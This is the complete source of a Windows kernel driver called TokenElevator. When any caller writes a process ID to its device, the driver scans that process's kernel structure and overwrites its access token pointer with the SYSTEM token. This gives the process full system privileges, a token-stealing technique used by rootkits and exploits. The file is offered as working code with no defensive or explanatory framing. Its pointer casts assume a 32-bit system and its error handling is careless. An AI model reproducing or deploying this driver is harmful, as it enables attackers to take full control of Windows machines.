#include <ntifs.h>
#include <ntddk.h>
#include "TokenElevator.h"

// Prototypes
void TokenElevatorUnload(_In_ PDRIVER_OBJECT DriverObject);
NTSTATUS TokenElevatorCreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
NTSTATUS TokenElevatorWrite(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
NTSTATUS CompleteIrp(PIRP Irp, NTSTATUS status = STATUS_SUCCESS, ULONG_PTR info = 0);
void ReplaceToken(PEPROCESS Process, PACCESS_TOKEN Token);

extern "C"
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);
	auto status = STATUS_SUCCESS;

	PDEVICE_OBJECT DeviceObject = nullptr;
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\TokenElevator");
	bool symLinkCreated = false;
	do
	{
		UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\TokenElevator");
		status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, 0, TRUE, &DeviceObject);
		if (!NT_SUCCESS(status)) {
			KdPrint((DRIVER_PREFIX "failed to create device (0x%08X)\n", status));
			break;
		}
		DeviceObject->Flags |= DO_DIRECT_IO;
		status = IoCreateSymbolicLink(&symLink, &devName);
		if (!NT_SUCCESS(status)) {
			KdPrint((DRIVER_PREFIX "failed to create sym link (0x%08X)\n", status));
			break;
		}
		symLinkCreated = true;

	} while (false);

	if (!NT_SUCCESS(status)) {
		if (symLinkCreated)
			IoDeleteSymbolicLink(&symLink);
		if (DeviceObject)
			IoDeleteDevice(DeviceObject);
	}

	DriverObject->DriverUnload = TokenElevatorUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObject->MajorFunction[IRP_MJ_CLOSE] = TokenElevatorCreateClose;
	DriverObject->MajorFunction[IRP_MJ_WRITE] = TokenElevatorWrite;

	return STATUS_SUCCESS;
}

NTSTATUS TokenElevatorWrite(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);
	PEPROCESS Process;
	PACCESS_TOKEN Token;
	auto status = STATUS_SUCCESS;

	auto buffer = MmGetSystemAddressForMdlSafe(Irp->MdlAddress, NormalPagePriority);
	if (!buffer) {
		return CompleteIrp(Irp, STATUS_INSUFFICIENT_RESOURCES);
	}
	status = PsLookupProcessByProcessId(UlongToHandle(*reinterpret_cast<unsigned long*>(buffer)), &Process);
	if (!NT_SUCCESS(status)) {
		return CompleteIrp(Irp, status);
	}
	Token = PsReferencePrimaryToken(Process);// Get the process primary token.
	ReplaceToken(Process, Token); // Replace the process token with system token.

	ObDereferenceObject(Token);
	ObDereferenceObject(Process);

	return CompleteIrp(Irp, status, sizeof(HANDLE));
}

NTSTATUS CompleteIrp(PIRP Irp, NTSTATUS status, ULONG_PTR info) {
	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = info;
	IoCompleteRequest(Irp, 0);
	return status;
}

void ReplaceToken(PEPROCESS Process, PACCESS_TOKEN Token) {
	PACCESS_TOKEN SystemToken;
	PULONG ptr;

	SystemToken = PsReferencePrimaryToken(PsInitialSystemProcess);
	ptr = (PULONG)Process;
	
	ULONG i;
	for (i = 0; i < 512; i++)
	{
		if ((ptr[i] & ~7) == (ULONG)((ULONG)Token & ~7))
		{
			ptr[i] = (ULONG)SystemToken; // Replace the orginal token with system token.
			break;
		}
	}

	ObfDereferenceObject(SystemToken);
}

NTSTATUS TokenElevatorCreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);
	return CompleteIrp(Irp);
}

void TokenElevatorUnload(_In_ PDRIVER_OBJECT DriverObject) {

	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\TokenElevator");
	IoDeleteSymbolicLink(&symLink);
	IoDeleteDevice(DriverObject->DeviceObject);
}